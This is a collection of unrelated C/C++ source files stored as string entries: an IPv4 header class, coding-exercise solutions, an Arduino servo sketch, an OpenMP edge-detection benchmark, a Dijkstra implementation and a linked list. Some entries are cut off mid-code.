    "#include <Ipv4.hpp>\n#include <arpa/inet.h>\n\nnamespace Packet\n{\nIpv4::Ipv4()\n    : Stackable(HeaderSize, std::make_shared<PacketEntity::Ipv4Entity>()), Version(0), Ihl(0), Tos(0), TotalLength(0),\n      Id(0), Flags(0), Ttl(0), Protocol(0), Checksum(0), SourceAddress({0}), DestinationAddress({0})\n{\n    RegisterCallbacks();\n\n    struct sockaddr_in sourceAddress;\n    struct sockaddr_in destinationAddress;\n    inet_pton(AF_INET, \"0.0.0.0\", &(sourceAddress.sin_addr));\n    inet_pton(AF_INET, \"0.0.0.0\", &(destinationAddress.sin_addr));\n\n    this->Version.Value(4);\n    this->Ihl.Value(5);\n    this->Tos.Value(0);\n    this->TotalLength.Value(this->Length());\n    this->Id.Value(0);\n    this->Flags.Value(0);\n    this->Ttl.Value(64);\n    this->Protocol.Value(IPPROTO_UDP);\n    this->Checksum.Value(0);\n    this->SourceAddress.Value(sourceAddress);\n    this->DestinationAddress.Value(destinationAddress);\n}\n\nIpv4::Ipv4(PacketEntity::Ipv4EntityPtr entity)\n    : Stackable(HeaderSize, entity), Version(entity->Version), Ihl(entity->IHL), Tos(entity->DSCP << 2 | entity->ECN),\n      TotalLength(entity->TotalLength), Id(entity->Identification), Flags(entity->Flags), Ttl(entity->TTL),\n      Protocol(entity->Protocol), Checksum(entity->HeaderChecksum), SourceAddress({0}), DestinationAddress({0})\n{\n    RegisterCallbacks();\n\n    auto header = this->Ipv4Header();\n\n    this->Version.Value(entity->Version);\n    this->Ihl.Value(entity->IHL);\n    this->Tos.Value(entity->DSCP << 2 | entity->ECN);\n    this->TotalLength.Value(entity->TotalLength);\n    this->Id.Value(entity->Identification);\n    this->Flags.Value(entity->Flags);\n    this->Ttl.Value(entity->TTL);\n    this->Protocol.Value(entity->Protocol);\n    this->Checksum.Value(entity->HeaderChecksum);\n\n    auto srcSockaddrIn = sockaddr_in();\n    inet_aton(entity->SourceAddress.c_str(), &srcSockaddrIn.sin_addr);\n    this->SourceAddress.Value(srcSockaddrIn);\n\n    auto dstSockaddrIn = sockaddr_in();\n    inet_aton(entity->DestinationAddress.c_str(), &dstSockaddrIn.sin_addr);\n    this->DestinationAddress.Value(dstSockaddrIn);\n}\n\nIpv4::~Ipv4()\n{\n}\n\nstruct iphdr *Ipv4::Ipv4Header() const\n{\n    auto data_ptr = this->DataArray().get();\n    iphdr_t *ipv4Header = reinterpret_cast<iphdr_t *>(data_ptr);\n    return ipv4Header;\n}\n\nvoid Ipv4::OnStacked(StackablePtr oldStackable, StackablePtr newStackable)\n{\n    Stackable::OnStacked(oldStackable, newStackable);\n\n    SPDLOG_TRACE(\"{}\", __PRETTY_FUNCTION__);\n    auto totalLength = Stackable::GetTotalLength(this->Stack.Value()) + this->Length();\n    TotalLength.Value(totalLength);\n    auto checksum = CalculateChecksum(this);\n    SPDLOG_DEBUG(\"checksum: {:04X}\", checksum);\n    Checksum.Value(checksum);\n}\n\nuint16_t Ipv4::CalculateChecksum(const Ipv4 *ipv4)\n{\n    SPDLOG_TRACE(\"{}\", __PRETTY_FUNCTION__);\n    uint32_t sum = 0;\n    auto header = ipv4->Ipv4Header();\n    auto ihl = header->ihl;\n    auto data = ipv4->DataArray().get();\n    auto dataLength = ipv4->Length();\n\n    iphdr_t temporaryHeader;\n    memcpy(&temporaryHeader, header, sizeof(iphdr_t));\n    if (temporaryHeader.check != 0)\n    {\n        SPDLOG_WARN(\"Checksum is not 0, setting it to 0\");\n        temporaryHeader.check = 0;\n    }\n\n    auto *dataPtr = reinterpret_cast<uint8_t *>(&temporaryHeader);\n    for (int i = 0; i < ihl * 2; i++)\n    {\n        sum += dataPtr[i * 2] << 8 | dataPtr[i * 2 + 1];\n    }\n    sum = (sum >> 16) + (sum & 0xFFFF);\n    sum += (sum >> 16);\n    return ~sum;\n}\n\nPacketEntity::Ipv4EntityPtr Ipv4::Entity()\n{\n    auto entity = this->StackableEntity();\n    return std::dynamic_pointer_cast<PacketEntity::Ipv4Entity>(entity);\n}\n\nvoid Ipv4::RegisterCallbacks()\n{\n    this->Version.RegisterCallback([this](int oldValue, int newValue) {\n        auto data = this->DataArray().get();\n        auto header = this->Ipv4Header();\n        header->version = newValue;\n\n        Entity()->Version = newValue;\n    });\n\n    this->Ihl.RegisterCallback([this](int oldValue, int newValue) {\n        auto data = this->DataArray().get();\n        auto header = this->Ipv4Header();\n        header->ihl = newValue;\n\n        Entity()->IHL = newValue;\n    });\n\n    this->Tos.RegisterCallback([this](uint8_t oldValue, uint8_t newValue) {\n        auto data = this->DataArray().get();\n        auto header = this->Ipv4Header();\n        header->tos = newValue;\n\n        Entity()->DSCP = newValue >> 2;\n        Entity()->ECN = newValue & 0x03;\n    });\n\n    this->TotalLength.RegisterCallback([this](uint16_t oldValue, uint16_t newValue) {\n        auto data = this->DataArray().get();\n        auto header = this->Ipv4Header();\n        header->tot_len = htons(newValue);\n\n        Entity()->TotalLength = newValue;\n    });\n\n    this->Id.RegisterCallback([this](uint16_t oldValue, uint16_t newValue) {\n        auto data = this->DataArray().get();\n        auto header = this->Ipv4Header();\n        header->id = htons(newValue);\n\n        Entity()->Identification = newValue;\n    });\n\n    this->Flags.RegisterCallback([this](uint16_t oldValue, uint16_t ne",
    "//https://www.hackerrank.com/challenges/luck-balance/problem?isFullScreen=true&h_l=interview&playlist_slugs%5B%5D=hackerrank\n\n#include <bits/stdc++.h>\n\nusing namespace std;\n\nstring ltrim(const string &);\nstring rtrim(const string &);\nvector<string> split(const string &);\n\n/*\n * Complete the 'luckBalance' function below.\n *\n * The function is expected to return an INTEGER.\n * The function accepts following parameters:\n *  1. INTEGER k\n *  2. 2D_INTEGER_ARRAY contests\n */\n\n\nint luckBalance(int k, vector<vector<int>> contests) {\n\n        \n        int n=contests.size();\n        int impcontest=0;\n        \n        for(int i=0;i<n;i++){\n            \n                if(contests[i][1]==1) impcontest++;\n                \n        }\n        \n        int towin=(impcontest-k);\n        priority_queue<pair<int,int>>pq;\n        \n        for(auto it:contests){\n            \n                pq.push({it[0],it[1]});\n            \n        }\n        \n        int sum=0;\n        int tolosseimp=k;\n        for(int i=0;i<n;i++){\n            \n            auto j=pq.top();\n            pq.pop();\n            \n            if(j.second==1 && tolosseimp>0){\n                 sum+=j.first;\n                 //towin--;\n                 tolosseimp--;\n            }\n            \n            else if(j.second==1 &&tolosseimp<=0){\n                \n                sum-=j.first;\n            }\n            else{\n                sum+=j.first;\n            }\n            \n           \n            \n        }\n        \n        return sum;\n        \n\n}\n\n\n\nint main()\n{\n    ofstream fout(getenv(\"OUTPUT_PATH\"));\n\n    string first_multiple_input_temp;\n    getline(cin, first_multiple_input_temp);\n\n    vector<string> first_multiple_input = split(rtrim(first_multiple_input_temp));\n\n    int n = stoi(first_multiple_input[0]);\n\n    int k = stoi(first_multiple_input[1]);\n\n    vector<vector<int>> contests(n);\n\n    for (int i = 0; i < n; i++) {\n        contests[i].resize(2);\n\n        string contests_row_temp_temp;\n        getline(cin, contests_row_temp_temp);\n\n        vector<string> contests_row_temp = split(rtrim(contests_row_temp_temp));\n\n        for (int j = 0; j < 2; j++) {\n            int contests_row_item = stoi(contests_row_temp[j]);\n\n            contests[i][j] = contests_row_item;\n        }\n    }\n\n    int result = luckBalance(k, contests);\n\n    fout << result << \"\\n\";\n\n    fout.close();\n\n    return 0;\n}\n\nstring ltrim(const string &str) {\n    string s(str);\n\n    s.erase(\n        s.begin(),\n        find_if(s.begin(), s.end(), not1(ptr_fun<int, int>(isspace)))\n    );\n\n    return s;\n}\n\nstring rtrim(const string &str) {\n    string s(str);\n\n    s.erase(\n        find_if(s.rbegin(), s.rend(), not1(ptr_fun<int, int>(isspace))).base(),\n        s.end()\n    );\n\n    return s;\n}\n\nvector<string> split(const string &str) {\n    vector<string> tokens;\n\n    string::size_type start = 0;\n    string::size_type end = 0;\n\n    while ((end = str.find(\" \", start)) != string::npos) {\n        tokens.push_back(str.substr(start, end - start));\n\n        start = end + 1;\n    }\n\n    tokens.push_back(str.substr(start));\n\n    return tokens;\n}\n",
    "#include <iostream>\r\n#include <cstring>\r\n#include <cstdlib>\r\n#include <cctype>\r\n#include <string>\r\n#define tsem 7\r\n#define tmax 6\r\nusing namespace std;\r\n\r\ntypedef struct{\r\n    string hinicial, hfinal, tipo, local, asst;\r\n}Compromisso;\r\n\r\ntypedef struct{\r\n    string dma, diasem;\r\n    int m;\r\n    Compromisso comp[tmax];\r\n}Agenda;\r\n\r\nchar menu();\r\nvoid toUpper(string&);\r\nbool validacaoVazio(string);\r\nbool verificaSeDifDig(string);\r\nbool verificaSeDifLet(string);\r\nvoid diasSemana(Agenda[]);\r\nvoid converteMes(string&);\r\nbool validaData(string,string);\r\nbool validaHora(string);\r\nbool validaHoraInicialxFinal(string,string);\r\nint pesquisaDataERetornaPos(int,Agenda[],string);\r\nint pesquisaHoraERetornaPos(int,Agenda[],string,int);\r\nint pesquisaHoraFinalERetornaPos(int,Agenda[],string,int);\r\nint ordenaComp(Agenda[],int,int,int,int);\r\nstring entradaDeDadosData();\r\nvoid iniciaSemana(Agenda[]);\r\nvoid incluiCompromisso(Agenda[]);\r\nvoid excluiCompromisso(Agenda[]);\r\nvoid relatorio1(Agenda[]);\r\nvoid relatorio2(Agenda[]);\r\n\r\nint main()\r\n{\r\n    char ch;\r\n    bool resp;\r\n    Agenda data[tsem];\r\n\r\n    do{\r\n        system(\"cls\");\r\n        diasSemana(data);\r\n        do{\r\n            resp=true;\r\n            ch=menu();\r\n            if(!isdigit(ch)){\r\n                resp=false;\r\n                system(\"cls\");\r\n                cout << \"Tente novamente.\" << endl;\r\n                system(\"pause\");\r\n                system(\"cls\");\r\n            }\r\n        }while(!resp);\r\n        system(\"cls\");\r\n        switch(ch){\r\n            case '1':\r\n                cin.ignore();\r\n                iniciaSemana(data);\r\n                system(\"pause\");\r\n                break;\r\n            case '2':\r\n                cin.ignore();\r\n                incluiCompromisso(data);\r\n                system(\"pause\");\r\n                break;\r\n            case '3':\r\n                cin.ignore();\r\n                excluiCompromisso(data);\r\n                system(\"pause\");\r\n                break;\r\n            case '4':\r\n                cin.ignore();\r\n                relatorio1(data);\r\n                system(\"pause\");\r\n                break;\r\n            case '5':\r\n                cin.ignore();\r\n                relatorio2(data);\r\n                system(\"pause\");\r\n                break;\r\n            default:\r\n                if(ch!='6'){\r\n                    system(\"cls\");\r\n                    cin.ignore();\r\n                    cout << \"Tente novamente.\" << endl;\r\n                    system(\"pause\");\r\n                }\r\n        }\r\n        system(\"cls\");\r\n    }while(ch!='6');\r\n    cout << \"Boa semana!\";\r\n    return 0;\r\n}\r\n\r\nchar menu(){\r\n    char ch;\r\n    cout << \"_________________MENU_________________\";\r\n    cout << \"\\n1 - INICIAR NOVA SEMANA\";\r\n    cout << \"\\n2 - INCLUIR COMPROMISSO\";\r\n    cout << \"\\n3 - EXCLUIR COMPROMISSO\";\r\n    cout << \"\\n4 - RELATORIO 1: COMPROMISSOS DO DIA\";\r\n    cout << \"\\n5 - RELATORIO 2: AGENDA SEMANAL\";\r\n    cout << \"\\n6 - SAIR\" << endl;\r\n    cin >> ch;\r\n    return ch;\r\n}\r\n\r\nvoid toUpper(string &aux){\r\n    char a;\r\n    string aux2=\"\";\r\n    for(unsigned int i=0;i<aux.size();i++){\r\n        a=toupper(aux[i]);\r\n        aux2+=a;\r\n    }\r\n    aux=aux2;\r\n}\r\n\r\nbool validacaoVazio(string aux){\r\n    if(aux.size()==0) return false;\r\n    return true;\r\n}\r\n\r\nbool verificaSeDifDig(string aux){\r\n    for(unsigned int i=0;i<aux.size();i++)\r\n        if(!isdigit(aux.at(i))) return false;\r\n    return true;\r\n}\r\n\r\nbool verificaSeDifLet(string aux){\r\n    for(unsigned int i=0;i<aux.size();i++)\r\n        if(!isalpha(aux.at(i))) return false;\r\n    return true;\r\n}\r\n\r\nvoid diasSemana(Agenda data[]){\r\n    data[0].diasem=\"DOMINGO\";\r\n    data[1].diasem=\"SEGUNDA\";\r\n    data[2].diasem=\"TERCA\";\r\n    data[3].diasem=\"QUARTA\";\r\n    data[4].diasem=\"QUINTA\";\r\n    data[5].diasem=\"SEXTA\";\r\n    data[6].diasem=\"SABADO\";\r\n}\r\n\r\nvoid converteMes(string &mes){\r\n    if(mes==\"JAN\") mes=\"01\";\r\n    if(mes==\"FEV\") mes=\"02\";\r\n    if(mes==\"MAR\") mes=\"03\";\r\n    if(mes==\"ABR\") mes=\"04\";\r\n    if(mes==\"MAI\") mes=\"05\";\r\n    if(mes==\"JUN\") mes=\"06\";\r\n    if(mes==\"JUL\") mes=\"07\";\r\n    if(mes==\"AGO\") mes=\"08\";\r\n    if(mes==\"SET\") mes=\"09\";\r\n    if(mes==\"OUT\") mes=\"10\";\r\n    if(mes==\"NOV\") mes=\"11\";\r\n    if(mes==\"DEZ\") mes=\"12\";\r\n}\r\n\r\nbool validaData(string mes, string dia){\r\n    int dias;\r\n    bool resp;\r\n    resp=validacaoVazio(mes);\r\n    if(!resp) return false;\r\n    resp=validacaoVazio(dia);\r\n    if(!resp) return false;\r\n    resp=verificaSeDifLet(mes);\r\n    if(!resp) return false;\r\n    resp=verificaSeDifDig(dia);\r\n    if(!resp) return false;\r\n    if(dia.size()!=2) return false;\r\n    dias=atoi(dia.c_str());\r\n    if(mes==\"JAN\" || mes==\"MAR\" || mes==\"MAI\" || mes==\"JUL\" || mes==\"AGO\" || mes==\"OUT\" || mes==\"DEZ\"){\r\n        if(dias<1 || dias>31) return false;\r\n        return true;\r\n    }\r\n    if(mes==\"FEV\"){\r\n        if(dias<1 || dias>28) return false;\r\n        return true;\r\n    }\r\n    if(mes==\"ABR\" || mes==\"JUN\" || mes==\"SET\" || mes==\"NOV\"){\r\n        if(dias<1 || dias>30) return false;\r\n        return true;\r\n    }",
    "#include <iostream>\n#include <vector>\n#include <algorithm>\n\nusing namespace std;\n\nbool compareApples(int a, int b) {\n    return a > b;\n}\n\nvoid distributeApples(const vector<int>& apples, int ramShare, int shamShare, int rahimShare) {\n    int totalWeight = 0;\n    for (int weight : apples) {\n        totalWeight += weight;\n    }\n\n    int totalRam = (ramShare * totalWeight) / 100;\n    int totalSham = (shamShare * totalWeight) / 100;\n    int totalRahim = (rahimShare * totalWeight) / 100;\n\n    vector<int> ramApples, shamApples, rahimApples;\n\n    for (int weight : apples) {\n        if (totalRam >= weight) {\n            ramApples.push_back(weight);\n            totalRam -= weight;\n        } else if (totalSham >= weight) {\n            shamApples.push_back(weight);\n            totalSham -= weight;\n        } else if (totalRahim >= weight) {\n            rahimApples.push_back(weight);\n            totalRahim -= weight;\n        } else {\n            cout << \"Apple of weight can not be distributed \" << weight <<endl;\n        }\n    }\n\n    cout << \"Distribution Result:\\n\";\n    cout << \"Ram: \";\n    for (int i : ramApples) {\n        cout << i << \" \";\n    }\n    cout << endl;\n    cout << \"Sham: \";\n    for (int i : shamApples) {\n        cout << i<< \" \";\n    }\n    cout << endl;\n    cout << \"Rahim: \";\n    for (int i : rahimApples) {\n        cout << i << \" \";\n    }\n    cout << endl;\n}\n\nint main() {\n    vector<int> apples;\n    int weight;\n\n    cout << \"Enter apple weight in grams (-1 to stop): \" << endl;\n    while (cin >> weight && weight != -1) {\n        apples.push_back(weight);\n    }\n\n    sort(apples.begin(), apples.end(), compareApples);\n\n    distributeApples(apples, 50, 30, 20);\n\n    return 0;\n}\n",
    "// pio project init --board unh\n\n// \n/**\n * -- THE TOOLBOX -- \n *\n * What this project will be, I do not know.\n * But for now it will open a curtian in my toolbox.\n *\n */\n\n// Project Creation: pio project init --board uno\n// Project Upload: pio run --target upload\n\n#include \"Arduino.h\"\n#include <Servo.h>\n#include \"TinyIRReceiver.hpp\"\n\n\n#define IR_RECEIVE_PIN 2\n#define SwitchPositionOnePin 4\n#define SwitchPositionTwoPin 3\n#define TEST_LED_1 8\n#define TEST_LED_2 9\n\nServo myservo1;\nServo myservo2;\nint servoPosition1;\nint servoPosition2;\n\nvoid setup()\n{\n  // Set button / switch input\n  pinMode(IR_RECEIVE_PIN, INPUT);\n  pinMode(SwitchPositionOnePin, INPUT);\n  pinMode(SwitchPositionTwoPin, INPUT);\n  pinMode(TEST_LED_1, OUTPUT);\n  pinMode(TEST_LED_2, OUTPUT);\n\n  // Set up servo #1\n  pinMode(servoPosition1, OUTPUT);\n  myservo1.attach(10);\n  myservo1.write(90);\n\n  // Setup servo #2\n  pinMode(servoPosition2, OUTPUT);\n  myservo2.attach(11);\n  myservo2.write(95);\n\n  // Initialize the IR receiver\n  initPCIInterruptForTinyReceiver();\n} \n\nvoid loop()\n{\n  // -- CURTAIN LOGICmmon as \n  if (TinyReceiverDecode()) {\n    if (TinyIRReceiverData.Command == 0x34) {\n      digitalWrite(TEST_LED_1, HIGH);\n      servoPosition1 = 120;\n      servoPosition2 = 65;\n    } \n    if (TinyIRReceiverData.Command == 0x32) {\n      digitalWrite(TEST_LED_2, HIGH);\n      servoPosition1 = 60;\n      servoPosition2 = 120;\n    } \n  }\n  myservo1.write(servoPosition1);\n  myservo2.write(servoPosition2);\n\n  // Delay and reset\n  delay(80);\n  digitalWrite(TEST_LED_1, LOW);\n  digitalWrite(TEST_LED_2, LOW);\n  servoPosition1 = 90;\n  servoPosition2 = 95;\n  myservo1.write(servoPosition1);\n  myservo2.write(servoPosition2);\n}\n\n",
    "#include <opencv2/opencv.hpp>\n#include <opencv2/highgui/highgui.hpp>\n#include <bits/stdc++.h>\n#include <curses.h>\n#include <sys/time.h>\n#include <time.h>\n#include <stdlib.h>\n#include <omp.h>\n\nusing namespace std;\nusing namespace cv;\nconst double PI = 3.14159265358979323846;\n\nint omp_thread_count() {\n    int n = 0;\n    #pragma omp parallel reduction(+:n)\n    n += 1;\n    return n;\n}\ncv::Mat imgOriginal;        // input image\ncv::Mat imgGrayscale;       // grayscale of input image\ncv::Mat imgBlurred;         // intermediate blured image\ncv::Mat imgCanny;           // Canny edge image\n\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\nint main() {\n\t\n\n\n\t//clock_t start1, end1, start2, end2, start3, end3, start4, end4, start5, end5, start6, end6, start7, end7;\n\tstruct timeval TimeValue_Start;\n  struct timezone TimeZone_Start;\n  struct timeval TimeValue_Final;\n  struct timezone TimeZone_Final;\n  long time_start, time_end;\n  double time_overhead1,time_overhead2,time_overhead3,time_overhead4,time_overhead5,time_overhead6,time_overhead7;\n\n\t\n\t\n\n\timgOriginal = cv::imread(\"cone.jpg\");          // open image\n\n\tMat myGreyImage(imgOriginal.rows, imgOriginal.cols, CV_8UC1, Scalar(0));  //myGreyImage\n\n\t//cout << imgOriginal.rows << \"\\n\" << imgOriginal.cols << \"\\n\";\n\tprintf(\"%d  %d\\n\", imgOriginal.rows, imgOriginal.cols);\n\tlong long pixels = imgOriginal.rows*imgOriginal.cols;\n\n\t//cout << \"Number of Pixels : \"<<pixels<<\"\\n\";\n\tprintf(\"Number of Pixels : %lld\\n\",pixels);\n\n\tint chunk = imgOriginal.rows / 8;\n\n\tif (imgOriginal.empty()) {                                  // if unable to open image\n\t\tstd::cout << \"error: image not read from file\\n\\n\";     // show error message on command line\n\t\t//_getch();                                               // may have to modify this line if not using Windows\n\t\treturn(0);                                              // and exit program\n\t}\n\n\t//cv::namedWindow(\"Original Image\");\n\t//cv::imshow(\"Original Image\", imgOriginal); \n\n\t////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n\n\t\t//  Converting to a grey scale image\n    int threads;\n    printf(\"Enter number of threads to use: \");\n    scanf(\" %d\", &threads);\n    \n    omp_set_num_threads(threads);\n    printf(\"threads = %d\\n\",omp_thread_count());\n\tgettimeofday(&TimeValue_Start, &TimeZone_Start);\n    int i=0;\n#pragma omp parallel for schedule(static,10)\n\tfor (i = 0; i < imgOriginal.rows; i++) {\n\t\t//printf(\"thread = %d\\ti = %d\\n\",omp_get_thread_num(),i);\n\t\tfor (int j = 0; j < imgOriginal.cols; j++) {\n\t\t\tmyGreyImage.at<uchar>(i, j) = (imgOriginal.at<Vec3b>(i, j)[0] + imgOriginal.at<Vec3b>(i, j)[1] + imgOriginal.at<Vec3b>(i, j)[2]) / 3;\n\n\t\t}\n\t}\n\tgettimeofday(&TimeValue_Final, &TimeZone_Final);\n    time_start = TimeValue_Start.tv_sec * 1000000 + TimeValue_Start.tv_usec;\n    time_end = TimeValue_Final.tv_sec * 1000000 + TimeValue_Final.tv_usec;\n    time_overhead1 = (time_end - time_start) / 1000000.0;\n\n\t/*cv::namedWindow(\"myGreyImg\");\n\tcv::imshow(\"myGreyImg\", myGreyImage);*/\n\n\t///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n\n\t\t//Applying Gaussian Blur \n\n\tdouble GausianFilter[5][5] = { {1, 4, 7, 4, 1},\n\t\t\t\t\t\t\t\t   {4, 16, 26, 16, 4},\n\t\t\t\t\t\t\t\t   {7, 26, 41, 26, 7},\n\t\t\t\t\t\t\t\t   {4, 16, 26, 16, 4},\n\t\t\t\t\t\t\t\t   {1, 4, 7, 4, 1}\n\t};\n\n\n\tMat myGaussian1(imgOriginal.rows - 4, imgOriginal.cols - 4, CV_8UC1, Scalar(0));\n\tMat myGaussian(imgOriginal.rows - 4, imgOriginal.cols - 4, CV_8UC1, Scalar(0));\n\n\n\n\tgettimeofday(&TimeValue_Start, &TimeZone_Start);\n\n#pragma omp parallel for schedule(static,10)\n\tfor (i = 0; i < myGaussian1.rows; i++) {\n\t\tfor (int j = 0; j < myGaussian1.cols; j++) {\n\t\t\tdouble temp = 0;\n\n\t\t\tfor (int k = 0; k < 5; k++) {\n\t\t\t\tfor (int l = 0; l < 5; l++) {\n\t\t\t\t\ttemp += GausianFilter[k][l] * myGreyImage.at<uchar>(k + i, l + j);\n\t\t\t\t}\n\t\t\t}\n\t\t\tmyGaussian1.at<uchar>(i, j) = temp / 273;\n\t\t}\n\t}\n\tgettimeofday(&TimeValue_Final, &TimeZone_Final);\n    time_start = TimeValue_Start.tv_sec * 1000000 + TimeValue_Start.tv_usec;\n    time_end = TimeValue_Final.tv_sec * 1000000 + TimeValue_Final.tv_usec;\n    time_overhead2 = (time_end - time_start) / 1000000.0;\n\n\tgettimeofday(&TimeValue_Start, &TimeZone_Start);\n\n\t//Applied filter second time to get more smooth image\n\n#pragma omp parallel for schedule(static,10)\n\tfor (i = 0; i < myGaussian.rows; i++) {\n\t\tfor (int j = 0; j < myGaussian.cols; j++) {\n\t\t\tdouble temp = 0;\n\t\t\tif (i<2 || j<2 || i> myGaussian.rows - 3 || j> myGaussian.cols - 3) {                 // to avoid reducing the size of image\n\t\t\t\tmyGaussian.at<uchar>(i, j) = myGaussian1.at<uchar>(i, j);\n\t\t\t\tcontinue;\n\t\t\t}\n\n\t\t\tfor (int k = 0; k < 5; k++) {\n\t\t\t\tfor (int l = 0; l < 5; l++) {\n\t\t\t\t\ttemp += GausianFilter[k][l] * myGaussian1.at<uchar>(k + i - 2, l + j - 2);\n\t\t\t\t}\n\t\t\t}\n\t\t\tmyGaussian.at<uchar>(i, j) = temp / 273;\n\t\t}\n\t}\n\tgettimeofday(&TimeValue_Final, ",
    "#include \"map.h\"\n\nusing namespace std;\n\n\nGraph::Graph(int nodes)\n{\n    this->nodesCount = nodes;\n    this->adjList = vector<vector<pair<int, int>>>(nodes);\n}\n\nvoid Graph::addEdge(int startNode, int endNode, int Weight)\n{\n    if (startNode >= 0 && startNode < nodesCount && endNode >= 0 && endNode < nodesCount)\n    {\n        adjList[startNode].push_back(make_pair(endNode, Weight));\n        adjList[endNode].push_back(make_pair(startNode, Weight));\n    }\n    else\n    {\n        // Handle the case where the provided node indices are out of bounds.\n        // You can print an error message or take appropriate action.\n        cout << \"Invalid node indices: \" << startNode << \" or \" << endNode << endl;\n    }\n    }\n\n// Function to get neighbors of a given vertex\nvector<int> Graph::getNeighbors(int vertex) const\n{\n    vector<int> neighbors;\n    if (vertex >= 0 && vertex < nodesCount)\n    {\n        for (const auto& neighbor : adjList[vertex])\n        {\n            neighbors.push_back(neighbor.first);\n        }\n    }\n    else\n    {\n        cout << \"Invalid vertex index: \" << vertex << endl;\n    }\n    return neighbors;\n}\n\n\n\nreturn_value::return_value(int distance, vector<vector<int>>& parent)\n{\n    this->distance = distance;\n    this->parent = parent;\n}\n\n\n// Function to get the an array from the algorithm containing execution time, no of comparisons and no of relaxation\nreturn_value Dijkstra(const Graph graph, int StartNode, int EndNode)\n{\n\n    // declaring the needed storage structures\n    vector<int> Dst(graph.nodesCount, INT_MAX);\n    vector<bool> vis(graph.nodesCount, false);\n    vector<vector<int>> parent(graph.nodesCount, vector<int>());\n\n    priority_queue<pair<int, int>, vector<pair<int, int>>, greater<pair<int, int>>> pq;\n\n    // initializing the storage structures\n    Dst[StartNode] = 0;\n    vis[StartNode] = true;\n    pq.push(make_pair(0, StartNode));\n\n    // main loop\n    while (!pq.empty())\n    {\n        // For finding the SDSP we can break the loop if the current node is the destination\n        //if (pq.top().second == EndNode) break;\n        // later we can send the distance and the path as output\n\n        // taking out the first element\n        int curr = pq.top().second;\n        pq.pop();\n\n        vis[curr] = true;\n\n        for (auto neigh : graph.adjList[curr])\n        {\n            int neighbor = neigh.first;\n            int weight = neigh.second;\n\n            if (vis[neighbor] != true)\n            {\n                int relax = Dst[curr] + weight;\n                if (relax < Dst[neighbor])\n                {\n                    Dst[neighbor] = relax;\n                    parent[neighbor].clear();\n                    parent[neighbor].push_back(curr);\n                    pq.push(make_pair(Dst[neighbor], neighbor));\n                }\n                else if (relax == Dst[neighbor])\n                {\n                    parent[neighbor].push_back(curr);\n                }\n            }\n        }\n    }\n\n    return return_value(Dst[EndNode], parent);\n}\n\n// Function to find all paths from source to destination\nvector<int> retrievePath(const vector<vector<int>>& parentVector, int source, int destination) {\n    vector<int> path;\n    int current = destination;\n\n    // If the destination is unreachable (no parent)\n    if (parentVector[destination].empty()) {\n        cout << \"No path exists from \" << source << \" to \" << destination << endl;\n        return path;\n    }\n\n    // Traverse the parent vector from destination to source\n    while (current != source) {\n        path.push_back(current);\n        if (parentVector[current].empty()) {\n            // Handle the case where there is a gap in the parent information\n            cout << \"Error: Parent information is incomplete.\" << endl;\n            return vector<int>();\n        }\n        current = parentVector[current][0];\n    }\n\n    // Add the source node to the path\n    path.push_back(source);\n\n    // Reverse the path to get it from source to destination\n    reverse(path.begin(), path.end());\n\n    return path;\n}\n\n",
    "#include<iostream>\nusing namespace std;\nclass Node{ \n    private: \n       int data; \n       Node* next; \n    public: \n       Node(){\n       }\n       int GetData(){\n       \t   return data;\n       }\n       Node* GetNext(){\n       \t   return next;\n       } \n       void SetData(int data){\n       \t   this->data=data;\n       } \n       void SetNext(Node* next){\n       \t   this->next=next;\n       }\n};\nclass List { \n    private: \n       Node *CurrentLocation; \n    public: \n       List(){\n\tCurrentLocation=NULL;\n} \n       void Print(){\n\tNode *TempNode=CurrentLocation;\n\tif(TempNode==NULL){\n\t\tcout<<\"List is empty\"<<endl;\n\t}\n\tif(TempNode->GetNext()==NULL){\n\t\tcout<<TempNode->GetData();\n\t\tcout<<\"-->\"<<\" NULL \"<<endl;\n\t}\n\telse{\n\t\tdo{\n\t\t\tcout<<TempNode->GetData();\n\t\t\tcout<<\"-->\";\n\t\t\tTempNode=TempNode->GetNext();\n\t\t}\n\t\twhile(TempNode!=NULL);\n\t}\n\tcout<<\"NULL\"<<endl;\n} \n       void Insert(int data){\n    Node* newNode = new Node();\n    newNode->SetData(data);\n    newNode->SetNext(NULL);\n    Node *tempNode = CurrentLocation;\n    if ( tempNode != NULL ) {\n       while ( tempNode->GetNext() != NULL ) {\n           tempNode = tempNode->GetNext();\n       }\n       tempNode->SetNext(newNode);\n    }\n    else {\n       CurrentLocation = newNode;\n    }\n} \n\n    void addbetween(int x, int newData) {\n    Node* newNode = new Node();\n    newNode->SetData(newData);\n    //newNode->SetNext(NULL);\n\n    Node* tempNode = CurrentLocation;\n\n    while (tempNode != NULL && tempNode->GetData() != x) {\n        tempNode = tempNode->GetNext();\n    }\n\n     if (tempNode != NULL) {\n            newNode->SetNext(tempNode->GetNext());\n            tempNode->SetNext(newNode);\n        }\n    }\n    \n    void Delete(int data) {\n    Node* tempNode = CurrentLocation;\n    Node* previous = NULL;\n\n    if (tempNode == NULL) {\n        cout << \"List is empty. Cannot delete.\" << endl;\n        return;\n    }\n\n    if (tempNode->GetData() == data) {\n        CurrentLocation = tempNode->GetNext();\n        delete tempNode;\n        return;\n    }\n\n    while (tempNode != NULL && tempNode->GetData() != data) {\n        previous = tempNode;\n        tempNode = tempNode->GetNext();\n    }\n\n    if (tempNode != NULL) {\n        previous->SetNext(tempNode->GetNext());\n        delete tempNode;\n    } \n}\n\n};\n\nint main(){\n\tList L1;\n\tL1.Insert(2);\n\tL1.Insert(10);\n\tL1.Insert(3);\n\tL1.Print();\n\tL1.addbetween(10,5);\n    cout << \"\\nUpdated List:\" << endl;\n    L1.Print();\n    L1.Delete(2);\n    cout << \"\\nAfter deleted Updated List:\" << endl;\n    L1.Print();\n}\n\n\n",
